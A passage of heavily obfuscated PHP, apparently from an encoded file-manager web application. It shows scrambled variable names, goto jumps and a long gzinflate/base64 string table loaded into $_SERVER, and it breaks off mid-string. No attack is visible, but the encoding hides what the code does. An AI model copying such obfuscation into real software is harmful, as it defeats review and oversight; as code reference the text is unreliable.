array($d¿Í‹¹Õ‰[552] => array($d¿Í‹¹Õ‰[511], $Cê‡ù»’ïÓ[$d¿Í‹¹Õ‰[485]] . $AâÍ‘»æ¸Ü . $d¿Í‹¹Õ‰[512])); } else { $bË êÏù„Ï[$d¿Í‹¹Õ‰[394]][1][] = $AâÍ‘»æ¸Ü; } } if (!$bË êÏù„Ï[$d¿Í‹¹Õ‰[394]][1]) { unset($bË êÏù„Ï[$d¿Í‹¹Õ‰[394]]); } if (!$bË êÏù„Ï) { return; } goto E¯‹¾êº›; dØ¤ŒÄ—©¹: } private function recycleMove($dìÙ­È…Öù, $FŞ¾¨“ïÏ² = 1) { $cˆëõ¹”Âõ =& $_SERVER[´¬]; $fóÎ¿İïù– = Model($cˆëõ¹”Âõ[1206]); $cçÒêÓä‹ = Model($cˆëõ¹”Âõ[1985]); $EâºÔØØâ = array($cˆëõ¹”Âõ[394] => $dìÙ­È…Öù); if ($FŞ¾¨“ïÏ²) { $fóÎ¿İïù–->where($EâºÔØØâ)->setField($cˆëõ¹”Âõ[421], 1); $cçÒêÓä‹->eventRecycle($dìÙ­È…Öù, $cˆëõ¹”Âõ[1986]); } else { $AÅ¹ÃÉø¥ö = $fóÎ¿İïù–->where($EâºÔØØâ)->find(); $B»Íšå…é = $AÅ¹ÃÉø¥ö[$cˆëõ¹”Âõ[401]] == $cˆëõ¹”Âõ[87]; $A¢‚Ùã×÷« = $fóÎ¿İïù–->fileNameAuto($AÅ¹ÃÉø¥ö[$cˆëõ¹”Âõ[476]], $AÅ¹ÃÉø¥ö[$cˆëõ¹”Âõ[28]], REPEAT_RENAME_FOLDER, $B»Íšå…é); if ($A¢‚Ùã×÷« != $AÅ¹ÃÉø¥ö[$cˆëõ¹”Âõ[28]]) { $fóÎ¿İïù–->rename($dìÙ­È…Öù, $A¢‚Ùã×÷«); } $fóÎ¿İïù–->where($EâºÔØØâ)->setField($cˆëõ¹”Âõ[421], 0); $cçÒêÓä‹->eventRecycle($dìÙ­È…Öù, $cˆëõ¹”Âõ[1987]); } } } goto BÚÔ£Ü°†; BİìĞ¤È—©: function binCheckBigger($DÈçİ£Øó¢, $B­ñŞ¬“¾±) { return $DÈçİ£Øó¢ > $B­ñŞ¬“¾±; } $_SERVER[$_SERVER[Ì][3]] = ("\x38\x39\x38\x30".base64_decode('MTQ='))+0;$_R568="kVJ4PyG3CCyTxIztczjwppKMer52HNfeETuSsWUvEB59d8CewgVmPcGnUnqydv3AP";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($C± „‰¥, $DØêõÂğ„) { $FôöÀ•…‡¸ =& $_SERVER[´¬]; if (isset(self::$_methodList[$C± „‰¥])) { return @call_user_func_array(self::$_methodList[$C± „‰¥], $DØêõÂğ„); } else { if (method_exists($this, $C± „‰¥)) { return call_user_func_array(array($this, $C± „‰¥), $DØêõÂğ„); } else { think_exception(__CLASS__ . $FôöÀ•…‡¸[4] . $C± „‰¥ . $FôöÀ•…‡¸[5]); } } } public static function __callStatic($a­®—‰¾é, $b¼Šàä¯ÉÄ) { if (isset(self::$_methodListStatic[$a­®—‰¾é])) { return call_user_func_array(self::$_methodListStatic[$a­®—‰¾é], $b¼Šàä¯ÉÄ); } else { if (method_exists(self, $a­®—‰¾é)) { return call_user_func_array(array(self, $a­®—‰¾é), $b¼Šàä¯ÉÄ); } else { show_json("{$a­®—‰¾é}\50\51\x20\156\x6f\164\x20\x65\170\x69\163\164\73", !1); } } } public static function addMethod($BÄé‚”…¿§, $AÄª–…â«–) { self::$_methodList[$BÄé‚”…¿§] = $AÄª–…â«–; } public static function addMethodStatic($d‡®¡ìÕ, $A²ÌÎèœÅ) { self::$_methodListStatic[$d‡®¡ìÕ] = $A²ÌÎèœÅ; } } goto F¹´™õÓÜé; d’³µ‡Šºò: if (!function_exists('_kodDe')) { function _kodDe($A„®³È˜Ô‘) { $A„®³È˜Ô‘ = base64_decode($A„®³È˜Ô‘); $CãÛ–ÉÈ¥ = strlen($A„®³È˜Ô‘); $BÖÈğùâÆ¹ = ''; $b¬ŒÏÉóÔ’ = ord($A„®³È˜Ô‘[0]) - 30; for ($EÂ±­ö¹Ò = 1; $EÂ±­ö¹Ò < $CãÛ–ÉÈ¥; $EÂ±­ö¹Ò += 2) { if ($EÂ±­ö¹Ò + 1 < $CãÛ–ÉÈ¥) { $BÖÈğùâÆ¹ .= chr(ord($A„®³È˜Ô‘[$EÂ±­ö¹Ò + 1]) + $b¬ŒÏÉóÔ’); $BÖÈğùâÆ¹ .= chr(ord($A„®³È˜Ô‘[$EÂ±­ö¹Ò]) + $b¬ŒÏÉóÔ’); } else { $BÖÈğùâÆ¹ .= chr(ord($A„®³È˜Ô‘[$EÂ±­ö¹Ò]) + $b¬ŒÏÉóÔ’); } } return $BÖÈğùâÆ¹; } } define("\264\254", "\242"); $_SERVER[´¬] = explode("\x7c\x3\x7c\x2\x7c\x3", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x3\xad\x7d\x9\x7c\x1b\xc5\xf5\x30\x57\x5b\x48\x9\x14\x1a\x4a\x38\xa\x8b\x73\xf8\x88\xe\xdb\x89\x73\x38\x76\x1c\xd9\x96\x6d\x25\xb2\xe5\x48\x72"."\x9c\x10\x3b\xca\x4a\x5a\x59\x6b\x4b\x5a\x79\x77\x65\xd9\x4e\xc2\x5d\x68\x21\x81\x70\x43\x28\x5\x1a\xae\x14\x1a\xce\xd0\x84\x2\x81\x96\x70\x1f\xe5\xbe\xaf\x40\x12\x92\x96\x94\xe3\xcf".base64_decode('XeCbe2ZXMv1/v++DJNp5c8+8efPemzdvnlp14KoDVh149vP4F/3dH/+eeN7B+w==')."\241\377\16\74\357\334\262\262\266\231\343\246\165\34\172\301\335\177\226\377\44\157\222\327\4\374\117\76\345\33\377\314\255\13\274\273\66\74\71\262\153\377\375\326\235\322"."\374\263\132\220\30\347\255\305\77\122\106\63\45\145\130\65\114\3\3\142\132\46\241\366\341\157\65\203\177\335\370\307\30\114\251\246\202\277\43\35\201\160\44\324\325\331".base64_decode('6Q2GI6REMT6txclXVtblNCk8q+gGqEosLpLVskrGAuGAuGzKUdkgJTU3Rpq9nQ==').base64_decode('/sDSSHhpp5ekiEYGc4o+gkPoM2TKuhlW0wpLkddZuxq9rb4OKRz0dIQ8TWFfoA==')."\x3\x83\x9b\x2\xed\xed\xbe\x70\x21\x3c\x18\xf0\xfb\x1b\x3d\x4d\xb\xb\x63\x3a\x83\x9e\xd6\x76\x8f\x4\xda\x97\x52\x22\x6a\x26\xa1\x95\x49\x2b\x70\xcc\xa\xa9\x1c\x7f\xb4\xa8\x4a\x2a".base64_decode('jj8zMm2OOZIlX2H2BeYgk0ulcKCDfZH2Kwk5lyJj1iwGsrqalmnXFyojDIo/5A==')."\234\251\251\231\30\16\170\207\115\135\346\160\320\342\230\256\244\225\14\51\52\344\365\173\233\302\22\154\246\324\22\14\264\113\144\52\322\262\141\52\272\324\335\346\15\172"."\45\330\364\372\122\324\343\122\11\347\353\352\0\3\42\171\374\176\151\254\22\114\45\235\245\305\340\74\105\12\13\4\233\275\101\251\161\251\304\307\51\246\245\323\132\306"."\5\112\1\363\151\12\115\365\6\203\370\303\101\60\330\357\203\123\107\2\201\226\226\220\227\205\110\347\26\371\101\113\246\23\54\265\204\342\211\224\31\31\222\123\71\212"."\254\3\370\267\224\374\220\137\315\40\10\74\250\146\324\34\101\126\122\204\246\261\225\103\76\162\64\265\102\41\112\234\174\244\101\176\215\54\56\260\322\206\360\147\375\74".base64_decode('/DuXJIpGYJyimxElE9Piaoasxway9ggGymayWVdBOlKg5opp2ZF2bYh0JqGmFA==')."\x3f\x5b\x6e\x9\x2d\x15\x57\x74\x1e\xce\x82\xec\x62\xc\xe9\x95\x3a\x2a\xe4\xee\xc8\xa5\xc5\x24\x2c\x18\x4b\xaa\xa9\xb8\x4e\x57\xe9\x8f\xa5\x4\x74\x40\x4d\x8c\xf0\xd5\x68\x68\x39\x3d"."\246\370\300\172\341\171\73\131\113\252\110\42\305\64\101\247\15\332\257\256\154\112\223\343\41\105\27\372\332\2\62\6\162\246\10\314\241\144\55\232\236\156\6\164\203\324"."\xf\x56\x8b\xda\x55\x24\x62\x80\xae\x97\xb8\x30\x84\x2e\x42\xef\xca\x96\x9d\xee\xfc\xbe\x77\xd9\x7c\xf0\x4f\x39\x21\x7e\x3d\xa4\x69\x49\x25\x95\x8a\x28\xc3\xa\x59\x57\xe9\x78\x8d\x41".base64_decode('++o2omrGDSA46AtEkrKRbI/XRFAuSlPjyrArm8ySpc9We48F7+HsdGimV6DMKQ==')."\55\46\247\304\236\342\357\244\151\146\103\112\46\16\7\204\364\110\313\147\320\200\145\25\205\44\152\166\110\161\251\135\132\52\265\325\252\265\6\315\230\116\261\57\332\73"."\x6\x33\x18\xd0\x1c\x26\x18\x53\x42\xc2\xca\xb0\x49\x6\x45\x9a\x1b\x4b\xca\x3a\x98\xae\xfa\x9c\x99\x70\xce\x26\xf4\x25\x9b\x4d\xa9\x31\xd9\x54\xb5\x8c\x5b\x8b\x99\x8a\xe9\x34\x4c\x5d"."\221\111\151\236\130\114\61\14\147\223\226\61\165\55\345\364\244\122\132\336\31\320\325\76\65\123\53\125\20\152\14\42\301\172\167\102\12\131\113\26\161\311\134\11\342\12"."\44\20\25\270\66\272\70\131\152\135\316\30\11\105\167\172\311\242\251\225\300\174\60\2\111\223\65\253\106\126\63\124\330\274\132\111\66\115\71\226\204\304\205\27\137\377"."\43\351\325\114\112\315\50\5\151\275\303\131\125\127\14\332\126\251\265\75\114\12\1\245\53\316\116\135\356\113\313\265\122\66\27\5\43\103\126\157\21\30\116\115\206\246"."\x56\x8a\xc1\xa0\x43\x4a\xe7\xc\xd3\xa9\x2b\x80\x4a\xa9\x60\x3f\x24\x73\xec\x4b\x38\xdb\xe1\xd2\x52\x95\xb8\x33\x4\x88\x39\x1\x4f\xaf\x9c\x21\x1\xb4\x91\x68\x1c\x86\xb6\x85\xc3\x9d".strrev('+R8ÜTå©Ø¯ Xˆ1,‰p)"³D€ı›hû”Û4©¸Ov‘¼;³Ø_')."\15\150\361\250\66\354\242\121\60\161\10\320\20\232\30\116\167\326\164\6\345\114\37\34\237\350\210\251\20\364\63\206\372\254\3\355\127\62\175\146\222\146\14\171\203\213"."\xbd\xc1\x48\x28\xd0\x12\xee\xf6\x4\xc9\x6e\x9f\x1\x58\x32\x4c\xab\x82\x45\xa7\x9c\x41\x25\xe\x86\x3e\x66\xd2\x7c\x72\x16\x8e\x1a\x4d\x3\x17\x6\x9c\x2b\x1a\xb\x17\xb\x8d\xf3\xfb"."\x5a\xe1\xc0\x34\x3b\xd\x90\xc8\x29\xa6\xa2\x65\xfb\xd5\xb4\xa\xdb\x6e\xb2\x18\x34\x92\x80\x15\x68\x25\xd\x72\xa3\xe\xd5\xf7\x24\x2b\xca\x7a\xe2\xd3\xca\x9d\xe0\xdf\x8a\xf2\x65\x3d"."\315\256\212\336\6\267\312\363\270\253\134\125\122\165\345\114\251\23\360\46\252\234\222\110\247\13\122\124\112\201\205\77\62\0\160\353\22\226\265\155\350\60\60\350\135\324".strrev('[£]ğ…bºkµ4¨Ù÷-/¹ÌôâëÓü2Ñí&—†¿/õàÔ™ [pŞí#…'."\r".'å').base64_decode('jVMyDoNtitqXJP1TYWkxLaXpcgpSMYrECqUsfWqCzA8mmDwQUtNZStfMZC4dFQ==')."\76\51\133\12\346\233\156\57\111\215\155\157\232\116\276\152\335\44\341\224\352\26\112\231\335\241\351\340\17\47\303\161\55\55\123\156\27\221\44\45\216\151\22\6\125\130".strrev('ë£¤Ü,I(T‘£¡JJã+hÛXå&Ğ§Ô“#Rf+´’[ªjn¦—ï™Úb')."\200\143\3\120\276\227\252\106\20\144\201\34\24\15\167\103\106\227\3\114\226\64\5\266\221\100\264\37\254\23\302\102\250\106\213\260\353\107\64\24\7\132\55\363\364\235"."\xba\x92\x50\xc9\x6a\xcb\x80\xa9\x6a\x97\xf5\x1\x9a\x1\x4c\xd\xdf\x6f\x60\x40\x28\xac\xa5\xcb\xef\x8f\x34\x5\x3a\xc2\x80\x79\xc6\x90\xee\xa0\x2f\xec\xa5\xc8\xe9\x69\x8e\x78\x9a\x3a"."\xd9\xee\xc9\xa7\x9a\x24\x80\x94\xa2\x70\x1b\xc0\x90\xa1\x6a\x61\xb\xe2\x7b\x15\xa7\xe2\x74\x8f\x85\x54\x1a\x7f\x3\xb2\x9c\xd5\x32\x86\xe2\x8c\x91\xd2\xe2\x9c\x9e\xe3\x14\x73\x6d\xc4"."\274\40\7\147\331\207\235\162\172\324\231\6\303\344\144\115\267\156\255\122\130\334\241\175\144\102\71\335\206\3\13\44\42\272\247\167\6\102\44\103\3\204\2\266\51\252"."\xe8\xa4\x1d\x9d\x5d\x24\x2a\x2d\x20\x53\xab\x97\x0\xc7\xd1\x6d\x5a\x26\x4c\x93\xa7\x3b\x44\x69\x6e\xe\xa4\xd7\xd5\x51\x99\xf7\xb1\x81\xb6\x87\x94\x3d\x9c\x4e\x71\x4e\xd0\xda\x2b\x27"."\237\213\160\233\257\143\141\244\75\320\354\365\107\174\35\200\40\205\13\341\135\235\315\36\72\271\42\274\61\20\156\263\100\273\0\111\132\354\361\373\354\311\275\113\174\241"."\160\250\150\24\200\165\171\155\61\100\10\354\14\172\133\174\113\130\260\305\347\365\67\207\42\115\236\246\66\236\246\303\323\116\2\221\4\24\303\14\267\65\175\4\320\326".base64_decode('EBPmIkNQMKWDFbFIThEqE0Q4HoB9UiG4R7oLxWHUE8Kcx7QcxUbGH6YpOUnLZA==').strrev('Q“	<‹²F	*4Ó ´Î„Kõ$€ÃAº‰öÑ#Ù™$\'’å?Ã,tÉY').strrev('TŸ!’VƒºG1(ƒzt	Ì¸$æĞñP@­t"Fh	€näƒÀf¬[').base64_decode('aAN8ZPjLKN9EBGeTkzDA9MhUduKD3q/RoVyFf6biH8DvkcqVDB31KCTjjDBQYQ==')."\10\254\6\112\202\265\34\253\55\252\151\51\272\116\301\326\317\350\1\23\271\373\15\212\44\303\224\370\114\243\173\31\331\112\302\201\205\336\216\10\305\54\34\22\260\21"."\x3\x80\x10\x1b\x8\x92\x1\x31\xb5\x1\x2a\x49\xe1\xc8\xa0\x37\x44\x57\xb9\xae\xc\xe6\x54\x3a\x5c\x6e\xd7\x34\x82\xc5\xa\xd8\xad\x48\xf5\xee\xe5\x3d\xf9\x69\x65\xcb\x9c\xd3\x5c\xbd"."\340\243\274\142\76\16\222\120\217\313\22\234\114\362\347\164\226\33\162\104\145\106\103\171\155\217\273\307\135\326\120\273\314\343\34\225\235\243\225\316\71\316\336\151\75\256"."\362\151\4\320\273\262\332\61\143\65\114\0\22\66\114\352\5\77\365\75\15\123\172\234\123\117\131\61\177\131\117\157\151\355\264\223\172\134\223\172\362\275\25\345\15\264".strrev('zÓ=œËñô¨s'."\n".'jærº³U!<‘I,Jp	4­>55„lbRNX').base64_decode('hHwCyF4X4JIA/U2ydB7nybBnLCtc9wQ/cpkYp55wXUTlGKEDal+GLSGw/TPp3A==')."\xca\xa0\xaf\x9c\x82\x7f\x57\xd3\x89\xec\x53\x86\x29\x69\xc8\x24\x54\x9d\x60\x67\x2e\xa3\xe\x52\xe5\x43\x46\x19\x24\x1f\x9a\x49\xf1\x3b\xaa\x98\x79\x85\xa2\x7\x80\x5b\xc2\x0\x39\xa8"."\104\10\242\204\120\12\361\203\244\6\56\231\51\110\114\41\275\310\106\40\63\226\147\241\270\222\41\363\164\10\111\155\304\344\254\22\22\172\30\211\204\75\215\176\157\204".base64_decode('UhhCiWkYUcVGpq4DXeMUldKHGOfOkSBCVr4xmJIQYZAUXdf0WqSWNHJZyMUBoQ==')."\xcb\x4\x63\x2b\x1\x89\x5d\xaa\x9f\x27\xe1\x21\x27\xf9\x22\xe2\x4\x64\x65\xca\x39\x40\x21\x9a\x71\x3\xee\xb2\x9e\x9e\xdc\x32\x25\xde\xbb\xc\x20\xb5\xec\x4c\xf4\xae\x9c\xbe\xba\x9c"."\62\347\356\36\360\37\15\140\132\106\132\237\345\163\151\0\56\215\162\116\236\42\332\263\10\243\206\21\260\77\273\140\73\230\2\304\22\140\321\70\250\351\214\151\312\132"."\xf8\x6d\x53\x33\xe5\x94\xa5\x88\x30\x84\x50\xd2\x44\x37\x6e\xa2\x2b\xc0\xb3\xed\xe7\x14\xb\x6e\xe5\x82\xf2\x11\x91\xd3\xe\xa6\x59\x63\x9a\xf\x41\xef\x5\x73\x84\x14\xd3\xc5\x52\x38"."\204\110\374\157\175\11\245\360\31\260\206\232\204\375\15\153\153\102\43\206\251\244\55\12\112\103\221\365\130\262\45\227\112\231\214\325\117\251\3\244\130\262\100\126\24\113"."\333\242\351\124\244\255\40\365\226\124\24\113\350\313\144\200\0\52\42\24\337\112\133\75\200\151\11\113\145\124\231\47\371\72\244\306\100\300\357\365\164\110\160\327\46\273"."\215\257\331\111\363\57\161\372\210\230\304\76\124\312\223\313\200\222\231\24\112\324\130\44\4\231\107\7\324\330\70\40\213\340\0\315\162\100\21\310\301\31\166\7\327\203"."\71\30\273\354\40\134\264\303\224\165\260\301\103\66\227\174\372\232\35\252\321\214\144\3\124\56\212\242\355\60\223\120\45\221\222\107\34\270\115\176\145\110\111\71\150\213".base64_decode('HLShDsriO5Cs1kxa0wVQnLQGfQKal3TA6YfY5+DqOVKdIFM4uLzh6NO1XLaT1g==')."\x24\x84\x70\x63\x8\x80\xb7\x94\x1\x82\x9a\x66\x3a\xa8\xf0\xe8\x28\x94\x2b\x8b\xf\x59\xf1\xa6\xa3\x31\xb6\xd7\x4d\xa8\x2f\xee\x8\x91\x88\x57\xd3\xad\xc3\x22\xa7\xf0\x51\xa7\x88\x9d"."\122\170\10\216\13\377\132\314\127\3\254\272\105\36\22\361\240\30\116\120\2\116\361\207\153\266\271\342\225\63\224\166\321\316\256\66\205\225\206\345\276\220\120\235\51\367"."\xd1\xba\x8a\xc4\xe2\xef\xa0\x12\x1b\x89\x71\xf1\xb0\x59\x90\x36\xad\x21\x86\x3d\x8\x95\x8b\xe1\x63\xf1\x29\x60\x38\xc6\xd0\x75\xdc\x21\x87\xd0\x81\xa4\x88\xc7\x30\xd2\x82\xaf\x63\x2e".strrev('Âõ,ttØş£`â+¼aB—ÉBêîlƒ<#š2p'."\n".''."\n".'5Ğ nÀ…êÁï–@§Ş')."\40\107\24\72\4\22\254\300\41\354\162\20\261\235\174\312\205\40\371\121\265\10\36\367\110\232\11\336\154\42\154\64\30\316\113\247\232\31\121\63\242\106\204\103\71\31".base64_decode('57sIRFybDqd5rG9MvrjGxUE0MQ4gSQ8IxJ5L/aD1MKvQdlKSreV0jZNOdwExMg==')."\142\103\134\202\262\111\131\347\143\112\127\30\104\163\256\147\202\111\170\120\110\226\220\207\370\16\147\311\43\254\23\303\34\241\255\27\77\255\205\342\140\363\130\201\66\46"."\35\27\13\212\113\120\65\374\140\354\212\175\243\236\206\265\242\101\250\263\241\337\32\302\177\172\166\152\331\200\220\174\131\106\141\144\47\213\10\122\47\133\231\326\174\270"."\201\36\106\334\0\113\230\2\304\127\167\301\305\324\12\151\251\110\34\31\61\63\40\335\306\337\102\242\254\235\354\132\266\205\2\120\141\102\266\101\330\240\266\40\257\334"."\102\247\10\226\147\263\112\46\16\223\10\213\315\122\54\325\377\125\222\14\161\40\210\273\164\114\32\135\200\213\43\7\172\216\112\141\213\345\353\173\245\201\30\33\102\112"."\x57\xdb\x86\xcd\x4\x12\x63\x54\xd6\x5d\x3a\xa8\x9f\xb7\x9c\x93\xe\xc2\xa2\xe5\x18\xa0\x97\x74\x4\x15\x5a\x2c\x7\x8e\xf1\x6b\x54\xdc\x80\xeb\xc7\x1b\x57\x4d\x8\x81\xe4\x51\xa3\x5a"."\x44\x9e\x50\x38\x5e\x63\x30\x91\x7a\xc1\x31\x73\x15\x4c\x16\xe7\xc4\x1c\x53\x2c\x29\x8b\x6d\xd\xae\xa\x44\xcd\x5d\x7c\xf3\x12\xb7\x3e\xf1\x4\x11\x9e\x41\xe2\x2f\xe1\xd8\x3d\xcd\xe"."\x25\x11\xd0\x65\x98\x5a\x96\xc7\x8\x41\x1c\x2d\x44\xf1\x42\x85\x54\x6c\xf8\x51\x9b\x0\x39\x8f\x23\x2e\x85\xf\x1a\x4a\x4b\xf2\x22\xb1\x4\xe3\xbd\x2b\x5\x52\x8\x9a\x6e\x5f\xb3\x47"."\327\51\232\340\16\101\35\50\0\212\40\270\306\103\124\211\133\214\150\343\302\275\103\374\70\35\27\5\53\166\341\335\306\45\307\343\1\252\223\24\277\13\223\212\52\232"."\342\5\41\13\7\126\224\20\52\236\334\223\112\361\163\117\173\170\314\54\170\315\212\231\104\310\230\331\132\220\170\100\17\50\212\301\30\147\51\62\143\126\346\213\237\102"."\333\231\64\53\135\32\173\47\37\203\100\361\11\55\36\6\273\136\123\122\315\50\6\333\274\164\243\110\217\41\146\216\65\115\60\116\120\242\1\71\21\0\304\175\201\151"."\212\70\121\20\266\76\264\215\104\114\313\246\35\104\145\10\250\152\31\175\260\64\360\110\266\350\132\332\27\0\250\137\34\37\354\351\24\252\53\103\24\146\130\55\326\121"."\x30\x7f\x70\xc7\x1f\xab\x4c\x1a\xcd\x8a\xe2\xec\xc1\x6f\xce\x7b\x74\xd7\x8d\x37\xe1\xef\x8b\xd6\xbc\x7d\xe5\x9e\x57\xd6\x7f\xf4\x22\xe\x56\xd5\xcc\xc0\x1f\xab\xf6\x47\xff\xa3\x6f\x6e"."\313\364\233\45\253\265\67\36\71\346\321\7\174\257\137\337\262\267\353\334\267\43\57\53\67\337\172\364\262\363\123\257\135\364\257\353\367\34\273\343\261\271\347\336\335\166".strrev('™I:ŞÿIí-ÿ8“¾_;ÇÓöçö¯ñŒõzX<£46ïÌÏt<4oãç÷‚').strrev('v:C‚İ}6—†Ôq¼ïãº|?yÎôÜí°æı._òáüÿ¾òÿªßgùiü{Õ')."\xed\x8d\xd7\xfa\x7f\xfd\xa7\x49\x7d\xcd\xbb\x8e\x38\x64\xe9\xf2\xd2\xa9\xe3\xdf\xcd\x3e\x7c\xc0\x2d\xbf\x1d\xdc\x18\xbc\x79\xbf\x29\xf1\xfd\x37\x1c\xd6\xbb\x6e\xfe\x53\x17\xfe\xfb\x82"."\222\300\232\325\245\353\137\37\210\155\236\374\375\141\325\307\165\334\174\374\61\217\15\336\135\66\371\364\104\313\37\116\112\316\275\344\231\113\336\175\141\343\175\351\366\55"."\x97\x3d\x94\xda\xbb\xf9\x6b\x75\x49\xf3\xd4\x8b\x8f\x1b\x7f\xec\xc8\xa1\x93\xd7\x4c\x1c\x7f\xfd\xf1\x4b\x7\x77\x7e\xd7\xba\xc1\x33\xbf\xe7\x89\xe0\xf8\x5f\x1f\xb0\x50\xbe\xfe\xb3\xf2".base64_decode('48cfcPfzjY/ObLvs3YtWLAi2zAhWv5p5ZPyGfe8tytc9d37Las+W2MorHJ89sA==')."\363\235\105\137\376\351\257\137\111\37\253\7\337\170\350\143\141\343\210\351\216\366\75\243\273\357\157\334\364\73\275\357\317\157\376\375\304\167\236\173\373\235\203\116\370\370".strrev('Ûç9ÿëû™Y~GĞõ¹~å¿˜¾Ëò~ƒ¬÷>-ÆÎğü.ççõ»š>ò/U\']')."\350\175\365\23\63\233\177\172\362\145\167\47\226\165\37\236\335\32\237\260\150\363\242\137\114\70\143\367\115\333\373\233\264\275\367\316\330\264\357\247\55\107\165\57\274\241".strrev('¿ƒşîÀôEvk;/ó!Éy:|­rß®}fc–”ıVü_Ï*#á]„§=Øøv').base64_decode('eni/J655PX7hTaesOS87fto3e3bc+tzkttu6brnyu8N2Dh/feransfKLJ6o7Dg==')."\xd9\xb4\xe7\xde\xd7\x52\x89\xb\x7f\x7f\xf4\x35\xa7\xff\xfa\xce\x3f\x7c\x74\xfd\xbc\xa9\xd3\xce\xbb\x64\xf0\x8e\xe4\x4\x79\xe5\xee\x7\x3d\xd3\x8e\x3c\xf8\xe6\xdd\xbf\x93\x9f\xeb\x5d"."\xf1\xd1\x1d\xbf\x88\xf5\x34\x7d\x7e\xf6\xf2\xfd\xff\x6a\xc\x9f\xd6\xf4\xe8\x2d\xeb\x8e\xc8\x5f\xf1\xdb\xc3\x16\xf9\xf6\x7b\x50\xbe\xf3\xee\xb\x7a\x2e\xba\x3a\xdf\x76\xf0\xfa\x95\x67"."\275\173\217\167\315\322\145\327\75\175\360\201\237\111\357\256\233\171\332\71\27\374\55\353\71\260\356\334\343\113\216\170\317\33\215\277\176\374\360\352\55\271\207\116\332\265".base64_decode('ofyYzqM2XvSw9vuqvWeavmc+PG7ghXvu/uMV+yqPvvv9g3edfeArWx8bmjot0g==')."\162\304\120\132\213\36\261\361\255\113\316\131\327\360\307\113\156\30\167\327\151\353\256\273\55\372\174\343\376\127\376\243\376\171\175\370\204\365\37\157\176\352\241\103\326\117"."\x8d\x6f\xac\xb9\x6b\x28\xb5\x66\xe7\xa2\xb\x1c\xe7\x6f\x79\x63\xe5\x8b\xf\x3d\x7f\xfa\xfc\xfe\xaf\x4f\x39\xf7\xc3\x35\xfb\x26\x56\x3d\xbf\x61\xff\xb\xe6\x5d\xf1\xc2\x6f\x76\x77\x9e"."\165\342\353\247\274\161\307\357\362\127\327\335\336\273\54\170\340\214\217\36\174\42\67\356\235\225\127\137\61\307\371\146\135\311\43\117\144\357\334\333\367\170\372\34\351\312".strrev('½Æ[sàÆùœÌß=õnVö¾¦+şÄöQÚÄ¬}pëlMl‹èsú®7Àù6>ï½Çj')."\370\342\375\147\74\342\134\160\333\63\137\116\330\157\374\336\53\277\230\360\362\41\261\173\146\375\372\300\107\332\47\314\31\170\163\373\304\306\125\37\35\374\324\72\255\364"."\373\253\376\161\314\47\233\56\252\363\56\354\54\73\333\167\144\262\57\176\355\233\257\156\70\64\172\333\63\213\156\375\362\164\257\362\315\213\341\233\227\367\136\271\50\133"."\267\40\350\157\231\272\350\276\207\147\373\274\276\71\303\333\23\317\334\170\370\61\257\137\372\314\233\375\153\277\115\177\164\155\315\153\217\257\157\375\306\377\217\16\337\57".base64_decode('Pl1279sbr/hn2eTN57bUNSnjTql556Uv/fcOTc6tGFj7wJmN/zz2pMOk3xofyA==').strrev('µí|kı+ ùVÿ—=òsŞWËxŸö;gSÊôİÛ9¸Úô>/íÕEùL;ïvk')."\125\35\317\115\154\313\234\63\370\362\176\327\315\135\371\335\352\77\327\114\74\364\337\3\337\135\167\355\133\377\316\250\33\336\313\136\164\307\110\320\165\374\344\337\254\125"."\257\334\357\372\305\63\136\270\152\263\176\307\222\51\173\176\272\351\326\53\256\77\271\157\375\332\353\327\176\22\336\165\356\213\177\130\362\342\357\326\234\276\345\234\350\202".base64_decode('4zZ+un5m9IclZePGtdyYmeG7v7Nm3bW/P+s/S16+6viy2t4FG3suHx0585tpbw==')."\x37\x2e\x75\x9c\x98\x77\x2d\x6f\x8b\x46\x6e\xda\xbe\x21\x92\x2a\x9b\x76\x57\xf7\xf1\xf\xf7\x7f\xb9\x79\xca\x9\xf7\x1e\x7a\xcc\x6d\xb5\x1f\x3e\xba\x7a\xc7\xcb\x7b\x8f\xba\xe5\x57\x39"."\x5f\x4f\xf7\xf2\x3b\xfe\x75\xe4\xd9\xfb\x2e\xec\x5a\xb3\xeb\xe3\xb9\xf7\x5c\xaf\xec\x78\xfd\xce\x2f\xdf\x5a\x78\x75\xf7\x2d\x47\x7d\xbb\x76\xd2\xdc\x3\x8f\xaa\x5c\x3e\xd3\x7f\xe0\x1f"."\xfd\x89\x9f\x7c\x73\x77\xcf\xa6\x9\xe7\x36\xbb\x7d\x97\x55\xfc\x6d\xf8\xd8\x97\xa3\x81\x1b\x7e\x3e\xab\xed\x17\xff\x78\xb7\x66\xc5\x89\xaf\x55\xfb\xbe\x3a\xe5\x4f\xe3\xaf\x39\xf4\xe1"."\253\117\273\50\372\300\365\213\317\377\111\374\341\377\274\175\373\206\137\347\133\143\57\135\372\223\207\47\237\176\320\333\317\304\365\153\327\336\173\377\276\233\347\36\160\210"."\xe3\x83\x91\x3b\xff\xfd\xe1\xbf\x2f\x28\xad\xeb\xb8\xfb\x8b\x8e\x81\x53\xb7\xcd\xdd\xef\xe3\x8d\x1f\xe6\xcb\xfe\xfd\xcc\x97\xff\x70\x6c\x7f\x65\xe0\xb1\x55\xbb\xa7\x6a\x9f\x1d\x7f\xec".base64_decode('6a9edcHbW85Z9LNrltwVvyM4eO0B6ev/+PZRlxy17Pcf/qaifOJBlYeefdRHHw==').strrev('ÁİËqú«gz›G·Ñ­¹)Ê#Şe|Ü¶éë|L7»æÿ~c·õ™n;¡ç9÷¬ú¬·')."\xfb\xef\xbf\x63\x64\xe0\xfd\x5f\x4d\x4c\xff\xea\xf9\xe8\x11\x17\xde\xbb\x7c\xbe\x7a\xe4\x49\x9e\x73\x8c\xa7\xf\xfa\xe5\xd4\x8d\xef\xff\xab\x73\xe1\xc9\xab\xb6\x34\xa7\x57\x7d\xfd\x64"."\251\373\207\217\357\172\362\331\357\365\257\167\174\262\375\232\23\116\375\354\177\136\333\171\336\321\132\357\3\137\175\372\237\257\337\171\266\141\370\213\117\137\150\210\324\375"."\360\257\35\371\206\155\167\36\376\346\167\177\330\362\345\167\47\356\175\350\352\23\367\37\270\50\176\327\204\203\7\146\36\161\375\103\337\177\161\354\342\223\324\17\352\377"."\66\174\326\123\367\126\135\73\377\205\165\173\77\257\56\251\351\275\347\336\352\207\46\16\136\134\326\66\330\120\326\172\350\221\306\204\375\246\136\261\275\253\373\256\316\277"."\244\336\316\37\275\376\363\327\377\362\273\322\236\33\347\76\166\305\366\143\6\47\155\275\376\342\157\366\236\173\337\175\333\356\114\256\270\346\302\315\233\216\